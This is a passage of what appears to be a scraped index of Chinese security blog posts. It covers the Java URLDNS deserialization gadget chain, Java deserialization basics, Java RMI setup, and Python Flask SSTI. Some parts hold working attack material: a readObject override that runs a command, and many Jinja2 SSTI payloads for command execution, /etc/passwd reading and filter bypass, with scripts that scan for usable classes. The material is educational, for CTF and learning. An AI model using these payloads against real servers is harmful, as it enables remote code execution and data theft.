and any hidden stuff  s.defaultReadObject(); reinitialize(); if (loadFactor \u0026lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + loadFactor); s.readInt(); // Read and ignore number of buckets  int mappings = s.readInt(); // Read number of mappings (size)  if (mappings \u0026lt; 0) throw new InvalidObjectException(\u0026#34;Illegal mappings count: \u0026#34; + mappings); else if (mappings \u0026gt; 0) { // (if zero, use defaults)  // Size the table using given load factor only if within  // range of 0.25...4.0  float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u0026lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u0026gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u0026lt; MAXIMUM_CAPACITY \u0026amp;\u0026amp; ft \u0026lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it\u0026#39;s the nearest public type to  // what we\u0026#39;re actually creating.  SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\u0026#34;rawtypes\u0026#34;,\u0026#34;unchecked\u0026#34;}) Node\u0026lt;K,V\u0026gt;[] tab = (Node\u0026lt;K,V\u0026gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap  for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } }   gadget说到了，接下来是putVal() -\u0026gt; hash()，我们再跟进hash方法\n1 2 3 4  static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); }   这里执行了一个key.hashCode()，这个key是一个对象，我们再回去看到gedget，最后是URL.hashCode()，是URL执行了hashCode()\n我们回去跟进URL，可以发现这里如果hashCode为-1的时候，他会重新计算hashCode，这时候就执行了一个handler.hashCode(this)\n1 2 3 4 5 6 7  public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; }   handler跟一下发现是：transient URLStreamHandler handler;，是URLStreamHandler类的对象\n我们再去跟进这个hashCode()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  protected int hashCode(URL u) { int h = 0; // Generate the protocol part.  String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part.  InetAddress addr = getHostAddress(u); if (addr != null) { h += addr.hashCode(); } else { String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); } // Generate the file part.  String file = u.getFile(); if (file != null) h += file.hashCode(); // Generate the port part.  if (u.getPort() == -1) h += getDefaultPort(); else h += u.getPort(); // Generate the ref part.  String ref = u.getRef(); if (ref != null) h += ref.hashCode(); return h; }   看到了一个很敏感的方法getHostAddress(u);，我们继续跟进这个方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  protected synchronized InetAddress getHostAddress(URL u) { if (u.hostAddress != null) return u.hostAddress; String host = u.getHost(); if (host == null || host.equals(\u0026#34;\u0026#34;)) { return null; } else { try { u.hostAddress = InetAddress.getByName(host); } catch (UnknownHostException ex) { return null; } catch (SecurityException se) { return null; } } return u.hostAddress; }   这里执行了一个InetAddress.getByName(host);，他的作用就是根据主机名去获取IP地址，也就会发送一次DNS请求\n那么我们现在要怎么去让他执行到URL的hashCode，这里看到yoserial是这样的做的\n1 2 3 4  URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url);   调用了一个ht.put(u, url);，跟进一看，这里刚好就有个方法完美的连接上了\n1 2 3  public V put(K key, V value) { return putVal(hash(key), key, value, false, true); }   到这里，整个利用链就算跟完了\n写个demo来测试一下payload\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  import org.junit.Test; import java.io.FileInputStream; import java.io.IOException; import java.io.ObjectInputStream; public class demo { @Test public void test() throws IOException, ClassNotFoundException { ObjectInputStream o = new ObjectInputStream(new FileInputStream(\u0026#34;xxx/payload.out\u0026#34;)); o.readObject(); } }   最后附上思维导图\n参考文章：\n《Java安全漫谈》\nhttps://redmango.top/article/34\nhttps://ego00.blog.csdn.net/article/details/119678492\n","date":"2022-09-29T00:34:07+08:00","permalink":"https://example.com/post/urldns/","title":"[Java安全] URLDNS"},{"content":"前言 在Java安全中，Java反序列化占据很重要的地位。\n在前面RMI的探索中，我们可以在数据包中看到，他传递的数据是序列化的\nJava的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式 生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象\n但Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取\n反序列化基础 要比较完美的实现反序列化的操作，有两个注意点\n 如果想让一个对象能够序列化，那么就要实现一个特殊的接口，这个接口就是java.io.Serializable，这个接口是空的，相当于是一个标记作用，意味着实现了这个接口的类可以进行序列化/反序列化 设置serialVersionUID，在进行反序列化时，JVM 会把传来的字节流中的 serialVersionUID 与本地相应实体类的 serialVersionUID 进行比较，如果相同就认为是一致的，可以进行反序列化，否则就抛出序列化版本不一致的异常- InvalidCastException  再来说说writeObject()和readObject()\n在writeObject中，得先创建一个ObjectOutputStream，然后利用这个把对象写入字节流，然后调用writeObject来序列化对象，代码实现如下\n 创建对象 创建文件流 创建对象输入流 把对象序列化写入对象输入流 释放资源关闭流  1 2 3 4 5 6 7 8  public static void serializing(String filename) throws IOException { serializeObj obj = new serializeObj(\u0026#34;Huamang\u0026#34;); FileOutputStream file = new FileOutputStream(filename); ObjectOutputStream out = new ObjectOutputStream(file); out.writeObject(obj); out.close(); file.close(); }   readObject就用对应的ObjectIntputStream和FileInputStream，读取加载在文件中的序列化对象并对其反序列化\n1 2 3 4 5 6  public static void unserializing(String filename) throws IOException, ClassNotFoundException { FileInputStream file = new FileInputStream(filename); ObjectInputStream in = new ObjectInputStream(file); serializeObj testclass = (serializeObj) in.readObject(); testclass.test(); }   然后写主类进行函数调用，最后的代码是这样的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  import java.io.*; public class serializeTest { public static void main(String[] args) throws IOException, ClassNotFoundException { String filename = \u0026#34;./data.txt\u0026#34;; serializeTest.serializing(filename); serializeTest.unserializing(filename); } public static void serializing(String filename) throws IOException { serializeObj obj = new serializeObj(\u0026#34;Huamang\u0026#34;); FileOutputStream file = new FileOutputStream(filename); ObjectOutputStream out = new ObjectOutputStream(file); out.writeObject(obj); out.close(); file.close(); } public static void unserializing(String filename) throws IOException, ClassNotFoundException { FileInputStream file = new FileInputStream(filename); ObjectInputStream in = new ObjectInputStream(file); serializeObj testclass = (serializeObj) in.readObject(); testclass.test(); } }   1 2 3 4 5 6 7 8 9 10 11 12  import java.io.Serializable; public class serializeObj implements Serializable { public String name; public serializeObj(String name){ this.name = name; } public void test(){ System.out.println(\u0026#34;This is \u0026#34;+name); } }   成功反序列化获得对象并执行方法\n对序列化流的分析 这里分析一下这个序列化数据，先转hex，然后利用工具\n1  java -jar SerializationDumper-v1.13.jar aced00057372000c73657269616c697a654f626a2ef7c37a55dbe7910200014c00046e616d657400124c6a6176612f6c616e672f537472696e673b78707400074875616d616e67   获得结果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  STREAM_MAGIC - 0xac ed STREAM_VERSION - 0x00 05 Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 12 - 0x00 0c Value - serializeObj - 0x73657269616c697a654f626a serialVersionUID - 0x2e f7 c3 7a 55 db e7 91 newHandle 0x00 7e 00 00 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 1 - 0x00 01 Fields 0: Object - L - 0x4c fieldName Length - 4 - 0x00 04 Value - name - 0x6e616d65 className1 TC_STRING - 0x74 newHandle 0x00 7e 00 01 Length - 18 - 0x00 12 Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 02 classdata serializeObj values name (object) TC_STRING - 0x74 newHandle 0x00 7e 00 03 Length - 7 - 0x00 07 Value - Huamang - 0x4875616d616e67   可以看到我的name是绑定了传入的数据\u0026quot;Huamang\u0026quot;的，想到前面说到：允许开发者在序列化流中插入一些自定义数据\n首先借鉴了feng师傅的一个图\n我们的obj是实现了Serializable接口的，但是里是空的，但是这里告诉我们，我们是可以重写readObject方法的，这样我们可以把恶意代码写入这里，然后被反序列化的时候就会执行我们构造的恶意代码，比如这样重写\n1 2 3 4 5  private void readObject(java.io.ObjectInputStream stream) throws IOException, ClassNotFoundException{ stream.defaultReadObject(); Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); }   看起来他的作用有点像PHP中的 __wakeup，但是他们的设计理念是不一样的\n Java设计 readObject 的思路和PHP的 __wakeup 不同点在于： readObject 倾向于解决“反序列化时如 何还原一个完整对象”这个问题，而PHP的 __wakeup 更倾向于解决“反序列化后如何初始化这个对象”的 问题。\n 同样的，我们writeObject也是可以重写自定义的\n废话不多说我们直接上代码理解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; public class serializeTest2 implements Serializable { public String name; public int id; public serializeTest2(String name, int id) { this.name = name; this.id = id; } private void writeObject(ObjectOutputStream os) throws IOException { os.defaultWriteObject(); os.writeObject(\u0026#34;Write Object\u0026#34;); } private void readObject(ObjectInputStream os) throws IOException, ClassNotFoundException { os.defaultReadObject(); System.out.println(os.readObject()); } }   然后修改刚刚序列化与反序列化的方法，把序列化的类换成这个类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  import java.io.*; public class serializeTest { public static void main(String[] args) throws IOException, ClassNotFoundException { String filename = \u0026#34;./data.txt\u0026#34;; serializeTest.serializing(filename); serializeTest.unserializing(filename); } public static void serializing(String filename) throws IOException { serializeTest2 obj = new serializeTest2(\u0026#34;Huamang\u0026#34;,1); FileOutputStream file = new FileOutputStream(filename); ObjectOutputStream out = new ObjectOutputStream(file); out.writeObject(obj); out.close(); file.close(); } public static void unserializing(String filename) throws IOException, ClassNotFoundException { FileInputStream file = new FileInputStream(filename); ObjectInputStream in = new ObjectInputStream(file); serializeTest2 testclass = (serializeTest2) in.readObject(); } }   执行并分析序列化数据\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  STREAM_MAGIC - 0xac ed STREAM_VERSION - 0x00 05 Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 14 - 0x00 0e Value - serializeTest2 - 0x73657269616c697a655465737432 serialVersionUID - 0xfd 59 ea 3d 16 b4 a0 7b newHandle 0x00 7e 00 00 classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE fieldCount - 2 - 0x00 02 Fields 0: Int - I - 0x49 fieldName Length - 2 - 0x00 02 Value - id - 0x6964 1: Object - L - 0x4c fieldName Length - 4 - 0x00 04 Value - name - 0x6e616d65 className1 TC_STRING - 0x74 newHandle 0x00 7e 00 01 Length - 18 - 0x00 12 Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 02 classdata serializeTest2 values id (int)1 - 0x00 00 00 01 name (object) TC_STRING - 0x74 newHandle 0x00 7e 00 03 Length - 7 - 0x00 07 Value - Huamang - 0x4875616d616e67 objectAnnotation TC_STRING - 0x74 newHandle 0x00 7e 00 04 Length - 12 - 0x00 0c Value - Write Object - 0x5772697465204f626a656374 TC_ENDBLOCKDATA - 0x78   可以看到我们writeObject的参数”Write Object“被放在了objectAnnotation下\n而在我反序列化的时候，执行readObject，读取到了这个数据并输出\n参考文章：\n《Java安全漫谈》\nhttp://h0cksr.xyz/archives/207\nhttps://redmango.top/article/34\nhttps://www.liaoxuefeng.com/wiki/1252599548343744/1298366845681698\n","date":"2022-09-28T16:12:56+08:00","permalink":"https://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"[Java安全] Java反序列化"},{"content":"前言 RMI全程Remote Method Invocation，远程⽅法调⽤\n他的功能是让一个Java虚拟机上的对象调用另一个Java虚拟机中对象上的方法，是Java独有的一种机制\n在网络传输的过程中，RMI中的对象是通过序列化的方式进行编码传输的，也就意味着，RMI在接受到序列化编码的对象后会进行反序列化，而在反序列化攻击中，我们可能很头疼怎么触发反序列化链，因此我们 可以利用RMI服务作为反序列化利用链的触发点\n他是由三层架构模式来实现的\n Client-客户端：客户端调用服务端的方法 Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果。 Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用   为了屏蔽网络通信的复杂性，RMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用远端（Server）的目标类之前，也会经过一个对应的远端代理类，就是 Skeleton，它从 Stub 中接收远程方法调用并传递给真实的目标类。Stubs 以及 Skeletons 的调用对于 RMI 服务的使用者来讲是隐藏的，我们无需主动的去调用相关的方法。但实际的客户端和服务端的网络通信时通过 Stub 和 Skeleton 来实现的。\n RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。\nRMI简单实现 Server 首先从Server来下手：\n⼀个RMIServer分为三部分：\n ⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello() ⼀个实现了此接⼝的类 ⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了。  首先是接口实现并继承Remote，里面创建一个hello方法，抛出RemoteException异常\n1 2 3  public interface IRemoteHelloWorld extends Remote { public String hello() throws RemoteException; }   然后创建一个类去实现这个接口用于远程调用\n继承UnicastRemoteObject类，貌似继承了之后会使用默认socket进行通讯，并且该实现类会一直运行在服务器上。如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  package com.example.RMI; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RMIServer extends UnicastRemoteObject implements IRemoteHelloWorld { protected RMIServer() throws RemoteException { super(); } @Override public String hello() throws RemoteException { return \u0026#34;hello world!\u0026#34;; } }   现在可以被远程调用的对象被创建好了，接下来就是思考该如何调用他了\n Java RMI 设计了一个 Registry 的思想，很好理解，我们可以使用注册表来查找一个远端对象的引用，更通俗的来讲，这个就是一个 RMI 电话本，我们想在某个人那里获取信息时（Remote Method Invocation），我们在电话本上（Registry）通过这个人的名称 （Name）来找到这个人的电话号码（Reference），并通过这个号码找到这个人（Remote Object）。\n 这种电话本的思想，由 java.rmi.registry.Registry 和 java.rmi.Naming 来实现。这里分别来说说这两个东西。\n先来说说 java.rmi.Naming，这是一个 final 类，提供了在远程对象注册表（Registry）中存储和获取远程对象引用的方法，这个类提供的每个方法都有一个 URL 格式的参数，格式如下： //host:port/name：\n host 表示注册表所在的主机 port 表示注册表接受调用的端口号，默认为 1099 name 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键字  那么这样就好理解了，我们现在实现了服务端待调用的对象，现在我们要把他装载进“电话本”，也就是注册\n这里是这样的步骤\n 利用LocateRegistry.createRegistry(1099);创建注册中心 实例化远程对象 把这个实例化对象绑定name存入“电话本”  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  package com.example.RMI; import java.net.MalformedURLException; import java.rmi.AlreadyBoundException; import java.rmi.Naming; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; public class RemoteServer { public static void main(String[] args) throws RemoteException, MalformedURLException, AlreadyBoundException { //创建注册中心  LocateRegistry.createRegistry(1099); //创建远程对象  RMIObject rmiObject = new RMIObject(); // 绑定name  Naming.bind(\u0026#34;rmi://localhost:1099/Hello\u0026#34;, rmiObject); } }   这样就算是把服务端给简单搭建好了\nClient 现在来搭建服务器端，进行远程加载服务端的代码，服务端加载远程代码的步骤：\n 使用Naming 在Registry中寻找到名字是Hello的对象 调用远程对象的方法属性  Naming有很多方法\n这里用lookup来测试，他返回：a reference for a remote object，远程对象的引用\n 此Naming.lookup()调用检查在 localhost 中运行的 RMI 注册表中是否存在名为“Hello”的绑定 它返回一个必须转换为我期望的任何远程接口的对象 然后就可以使用该对象调用接口中定义的远程方法  1 2 3 4 5 6 7 8 9 10 11 12 13 14  package com.example.RMI; import java.net.MalformedURLException; import java.rmi.Naming; import java.rmi.NotBoundException; import java.rmi.RemoteException; public class RMIClient { public static void main(String[] args) throws MalformedURLException, NotBoundException, RemoteException { IRemoteHelloWorld obj = (IRemoteHelloWorld) Naming.lookup(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); System.out.println(obj.hello()); } }   这样就算简单的完成了一个RMI的操作\n远程也可以加载成功（虚拟机）\nRMI攻击 先留坑  https://xz.aliyun.com/t/9261\nhttps://xz.aliyun.com/t/6660\nhttps://redmango.top/article/70\nhttps://paper.seebug.org/1091/\nhttps://su18.org/post/rmi-attack\n","date":"2022-09-27T14:43:46+08:00","permalink":"https://example.com/post/java%E5%AE%89%E5%85%A8_rmi/","title":"[Java安全] RMI"},{"content":"前言 之前一直是套着公式去做ssti的题目，遇到需要一些变化的，可能就会卡住了，所以这里打算学习并梳理一下关于Python中SSTI的知识点\nFlask 首先，是python是SSTI，那么就离不开flask，这里用一个简单的flask demo来介绍一下他的模板渲染\n构造如下的代码，以及目录结构\n目录结构\n1 2 3  ├── app.py └── templates └── index.html   app.py内容\n1 2 3 4 5 6 7 8 9 10 11 12 13  from flask import Flask from flask import render_template from flask import request from flask import render_template_string app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) @app.route(\u0026#39;/index\u0026#39;) def index(): return render_template(\u0026#34;index.html\u0026#34;,user=request.args.get(\u0026#34;name\u0026#34;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True)   index.html的内容\n1 2 3 4 5 6 7 8  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;SSTI\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Hello, {{user.name}}!\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   可以看到这里是已经可以进行模板的渲染了，但是我们的{{7*7}}没有被渲染，这是因为这是正确的写法，并不存在SSTI漏洞\n而什么情况才会存在SSTI的漏洞呢，很多很多的安全漏洞都源于程序员偷懒的不规范代码，这里也是，假如有个很小的功能点但是开发者不愿意创建一个html文件，选择直接用字符串插入html的话，那么漏洞可能就来了,比如下面这个demo\n1 2 3 4 5 6 7 8 9  @app.route(\u0026#39;/test\u0026#39;) def test(): template = \u0026#34;\u0026#34;\u0026#34; \u0026lt;div class=\u0026#34;center-content\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Hello, %s\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026#34;\u0026#34;\u0026#34; % (request.args.get(\u0026#39;name\u0026#39;)) return render_template_string(template)   可以看到，这里是成功解析了的\n攻击原理 那么知道了漏洞存在了以后，我们改怎么利用，我们把最终的目标放在RCE，那么我们怎么才能在双大括号里面RCE，这就得从python语言来说起了，这里先给出几个核心的方法\n1 2 3 4 5 6 7 8  __class__ 取类 __bases__[0] 拿基类 __base__ 拿基类 __mro__ 返回一个类的调用顺序，__mro__[1]或者__mro__[-1]拿到基类 __subclasses__() 返回子类集合 __init__ 类的初始化方法，所有自带带类都包含init方法，便于利用他当跳板来调用globals __globals__ function.__globals__，用于获取function所处空间下可使用的module、方法以及所有变量 __builtins__ 是一个包含了大量内置函数的一个模块   python中所有的类的基类，都是object，我们可以这样获取类\nxx.__class__，例如字符串，元组，列表\n在python中每个类都有一个bases属性，这个的意思就是基类，也就是之前提到的object\n拿到基层的object，我们就可以往其他的方向去发展了，这里就用到了一个subclasses() 方法，他的作用是：返回的是这个类的子类的集合，也就是object类的子类的集合\n那么就可以供我们挑选了，我们找到可以利用的类，选中来利用，例如这里的\u0026lt;class \u0026lsquo;os._wrap_close\u0026rsquo;\u0026gt;\n不同版本的python可能会在不用的位置，我的环境里是\u0026quot;\u0026quot;.__class__.__bases__[0].__subclasses__()[133]\n这里就到了下一个点，.init.globals，这个init用来初始化类，globals用来全局查找所有方法和变量及参数\n可以发现，这里是有popen的，这个就可以命令执行了\n这样就可以rce了\n1  {{\u0026#34;\u0026#34;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[\u0026#39;popen\u0026#39;](\u0026#39;ls\u0026#39;).read()}}   当然这只是其中一个方法，在获取到了object后，能走的路非常多，获取object的方法也很多\n比如__mro__，这个就可以用来获取基类，他会返回一个类的调用顺序，其中就必定会有object\n利用 找利用链 这里我们可以用脚本来跑出我们想要的东西\n本地\n1 2 3 4 5 6 7 8 9  search = \u0026#39;popen\u0026#39; num = -1 for i in ().__class__.__bases__[0].__subclasses__(): num += 1 try: if search in i.__init__.__globals__.keys(): print(i, num) except: pass   1 2 3 4 5 6 7 8 9 10 11  count = -1 for i in \u0026#39;\u0026#39;.__class__.__mro__[-1].__subclasses__(): count += 1 if \u0026#34;warpper\u0026#34; in repr(i.__init__): pass else: try: if \u0026#34;os\u0026#34; in repr(i.__init__.__globals__): print(count, i) except: pass   远程\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  import json a = \u0026#34;\u0026#34;\u0026#34; \u0026lt;class \u0026#39;type\u0026#39;\u0026gt;,...,\u0026lt;class \u0026#39;subprocess.Popen\u0026#39;\u0026gt; \u0026#34;\u0026#34;\u0026#34; num = 0 allList = [] result = \u0026#34;\u0026#34; for i in a: if i == \u0026#34;\u0026gt;\u0026#34;: result += i allList.append(result) result = \u0026#34;\u0026#34; elif i == \u0026#34;\\n\u0026#34; or i == \u0026#34;,\u0026#34;: continue else: result += i for k,v in enumerate(allList): if \u0026#34;os._wrap_close\u0026#34; in v: print(str(k)+\u0026#34;---\u0026gt;\u0026#34;+v)   或者直接利用题目环境直接搜出来，例如：\n1 2 3 4 5 6  查看warnings.catch_warnings方法的位置 [].__class__.__base__.__subclasses__().index(warnings.catch_warnings) 查看linecatch的位置 [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(\u0026#39;linecache\u0026#39;) 剩下的以此类推   RCE eval 首先，题目环境的不一样可能需要我们去找环境中含有内建函数 eval 的子类的索引号\n这里脚本的原理就是通过遍历__subclasses__，然后再通过.__init__.__globals__['__builtins__']里面找是否存在eval函数字眼\n1 2 3 4 5 6 7 8  import requests for i in range(500): url = \u0026#34;http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[\u0026#34;+str(i)+\u0026#34;].__init__.__globals__[\u0026#39;__builtins__\u0026#39;]}}\u0026#34; res = requests.get(url=url) if \u0026#39;eval\u0026#39; in res.text: print(i)   我们可以记下几个含有eval函数的类：\n warnings.catch_warnings WarningMessage codecs.IncrementalEncoder codecs.IncrementalDecoder codecs.StreamReaderWriter os._wrap_close reprlib.Repr weakref.finalize  示例payload\n1  {{\u0026#39;\u0026#39;.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;)}}   os模块 Python的 os 模块中有system和popen这两个函数可用来执行命令，system没有回显，popen有回显\n而找os模块的方法就和上面的差不多，可以编写脚本，遍历subclass的类里的__init__.__globals__\n查找里面有没有导入os模块\n1 2 3 4 5 6 7 8  import requests for i in range(500): url = \u0026#34;http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[\u0026#34;+str(i)+\u0026#34;].__init__.__globals__}}\u0026#34; res = requests.get(url=url, headers=headers) if \u0026#39;os.py\u0026#39; in res.text: print(i)   示例payload\n1  {{\u0026#39;\u0026#39;.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;ls /\u0026#39;).read()}}   subprocess.popen类 subprocess 意在替代其他几个老的模块或者函数，比如：os.system、os.popen 等函数。\n1 2 3 4 5 6 7 8  import requests for i in range(500): url = \u0026#34;http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[\u0026#34;+str(i)+\u0026#34;]}}\u0026#34; res = requests.get(url=url, headers=headers) if \u0026#39;linecache\u0026#39; in res.text: print(i)   则构造如下payload执行命令即可：\n1  {{[].__class__.__base__.__subclasses__()[245](\u0026#39;ls /\u0026#39;,shell=True,stdout=-1).communicate()[0].strip()}}   linecache 函数 linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块\n1 2 3 4 5 6 7 8  import requests for i in range(500): url = \u0026#34;http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\u0026#34;+str(i)+\u0026#34;].__init__.__globals__}}\u0026#34; res = requests.get(url=url, headers=headers) if \u0026#39;linecache\u0026#39; in res.text: print(i)   示例payload\n1  {{[].__class__.__base__.__subclasses__()[168].__init__.__globals__[\u0026#39;linecache\u0026#39;][\u0026#39;os\u0026#39;].popen(\u0026#39;ls /\u0026#39;).read()}}{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen(\u0026#39;ls /\u0026#39;).read()}}   lipsum 前段时间兴起的一条路，非常方便的可以进行rce\n1 2 3  {{lipsum.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;whoami\u0026#39;).read()}} {{lipsum.__globals__.os.popen(\u0026#39;whoami\u0026#39;).read()}} {{lipsum.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read()\u0026#34;)}}   文件读取 如果实在没有命令执行，那就看看有没有文件读取的操作\npython2中file类可以直接用来读取文件\n1  {{[].__class__.__base__.__subclasses__()[40](\u0026#39;/etc/passwd\u0026#39;).read()}}   python3中没有这个file类，可以用\u0026lt;class '_frozen_importlib_external.FileLoader'\u0026gt; 这个类去读取文件。\n1 2 3 4 5 6 7 8  import requests for i in range(500): url = \u0026#34;http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[\u0026#34;+str(i)+\u0026#34;]}}\u0026#34; res = requests.get(url=url, headers=headers) if \u0026#39;FileLoader\u0026#39; in res.text: print(i)   示例payload\n1  {{().__class__.__bases__[0].__subclasses__()[79][\u0026#34;get_data\u0026#34;](0, \u0026#34;/etc/passwd\u0026#34;)}}   Bypass {{ 绕过方法\n（直接写给gitpage整报错了）\n[] 过滤了[]后，我们payload有几个地方就过不去了\n1  {{\u0026#34;\u0026#34;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[\u0026#39;popen\u0026#39;](\u0026#39;ls\u0026#39;).read()}}   getitem 那么这里就可以利用函数getitem()进行获取列表元素，payload就变成这样\n1  {{\u0026#34;\u0026#34;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[\u0026#39;popen\u0026#39;](\u0026#39;ls\u0026#39;).read()}}   pop 最好不要用pop()，因为pop()会删除相应位置的值\n1 2 3  {{\u0026#39;\u0026#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(\u0026#39;/etc/passwd\u0026#39;).read()}}// 指定序列属性 {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop(\u0026#39;__builtins__\u0026#39;).pop(\u0026#39;eval\u0026#39;)(\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;)}}// 指定字典属性   字典 我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号 [] 里来访问，一种就是用点 . 来访问。所以，当方括号 [] 被过滤之后，我们还可以用点 . 的方式来访问，如下示例\n1 2 3  __builtins__.eval() {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval(\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;)}}   等同于：\n1 2 3  [__builtins__][\u0026#39;eval\u0026#39;]() {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;)}}   _ 